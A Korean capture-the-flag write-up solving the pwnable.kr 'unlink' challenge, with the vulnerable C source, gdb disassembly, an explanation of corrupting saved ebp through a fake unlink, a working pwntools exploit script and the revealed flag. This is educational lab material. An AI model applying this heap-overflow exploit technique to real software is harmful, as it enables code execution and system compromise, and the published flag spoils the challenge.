# 문제
Daddy! how can I exploit unlink corruption?

ssh unlink@pwnable.kr -p2222 (pw: guest)

---  
# 개요
```
unlink@ubuntu:~$ ls
flag  intended_solution.txt  unlink  unlink.c
unlink@ubuntu:~$ cat intended_solution.txt
cat: intended_solution.txt: Permission denied
```  
음 별로 도움은 되지 않네요 ㅡㅡ;; unlink.c를 살펴봅시다.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;

void shell(){
	system("/bin/sh");
}

void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
int main(int argc, char* argv[]){
	malloc(1024);
	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
	OBJ* C = (OBJ*)malloc(sizeof(OBJ));

	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;

	printf("here is stack address leak: %p\n", &A);
	printf("here is heap address leak: %p\n", A);
	printf("now that you have leaks, get shell!\n");
	// heap overflow!
	gets(A->buf);

	// exploit this unlink!
	unlink(B);
	return 0;
}
```
힙 영역에서 발생하는 취약점을 먼저 보고올 필요가 있습니다.
* ![링크1](https://bpsecblog.wordpress.com/2016/10/06/heap_vuln/) Hackers on the Ship 블랙펄 화이팅!
* ![링크2](http://www.hackerschool.org/HS_Boards/data/Lib_system/doublefree.txt) Hackerschool

두 개의 문서를 보고 풀이를 보시면 좀더 편합니다!
```c
gets(A->buf);

// exploit this unlink!
unlink(B);
return 0;
```
A를 Overflow 시켜서 공격을 하는 문제 입니다.
이 코드를 통해 B를 조작할 수 있습니다.
```c
void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
```
보통 unlink는 free를 하면서 일어나는데 여기서는 free를 하는 대신 unlink 함수를 따로 정의하여 사용합니다.

먼저 unlink를 disassembly 해서 살펴봅니다.
```
(gdb) disas unlink
Dump of assembler code for function unlink:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	sub    $0x10,%esp
   0x0804850a <+6>:	mov    0x8(%ebp),%eax
   0x0804850d <+9>:	mov    0x4(%eax),%eax
   0x08048510 <+12>:	mov    %eax,-0x4(%ebp)
   0x08048513 <+15>:	mov    0x8(%ebp),%eax
   0x08048516 <+18>:	mov    (%eax),%eax
   0x08048518 <+20>:	mov    %eax,-0x8(%ebp)
   0x0804851b <+23>:	mov    -0x8(%ebp),%eax
   0x0804851e <+26>:	mov    -0x4(%ebp),%edx
   0x08048521 <+29>:	mov    %edx,0x4(%eax)
   0x08048524 <+32>:	mov    -0x4(%ebp),%eax
   0x08048527 <+35>:	mov    -0x8(%ebp),%edx
   0x0804852a <+38>:	mov    %edx,(%eax)
   0x0804852c <+40>:	nop
   0x0804852d <+41>:	leave  
   0x0804852e <+42>:	ret    
End of assembler dump.
(gdb)
```
unlink(B)이므로 모든 것을 B로 정리를 하면 아래와 같습니다.  
* bk를 ebp - 0x4에 저장
* fd를 ebp - 0x8에 저장
* [fd+4]에 bk를 저장
* [bk]에 fd를 저장

이를 이용하여 원하는 곳에 원하는 값을 입력 가능합니다.

필자는 ret를 직접적으로 건드리지 못하기 때문에
unlink 함수의 SFP를 조작하여 main의 esp 값을 조작해서 문제를 해결했습니다.
ebp를 조작하여 heap에 할당된 데이터영역(buf)를 사용하여 eip에 shell의 주소를 넣었습니다.

```python
from pwn import*

p = ssh(user='unlink',host='pwnable.kr',port=2222,password='guest')
connect = p.process("./unlink")

connect.recvuntil("here is stack address leak: ")
stack_leak = int(connect.recvline().strip(),16)
ret = stack_leak+40

connect.recvuntil("here is heap address leak: ")
heap_leak = int(connect.recvline().strip(),16)

shell = 0x80484eb
ebp = stack_leak-0x1c
fake_ebp = heap_leak+16

payload = p32(shell)+p32(fake_ebp-4)+"A"*8
payload += p32(fake_ebp)
payload += p32(ebp)

connect.sendline(payload)
connect.interactive()
```
실행시켜봅시다!
```
secretpack@ubuntu:~/Desktop$ python exp.py
[+] Connecting to pwnable.kr on port 2222: Done
[!] Couldn't check security settings on 'pwnable.kr'
[+] Starting remote process './unlink' on pwnable.kr: pid 54659
[*] Switching to interactive mode
now that you have leaks, get shell!
$ $ ls
flag  intended_solution.txt  unlink  unlink.c
$ $ cat flag
conditional_write_what_where_from_unl1nk_explo1t
```
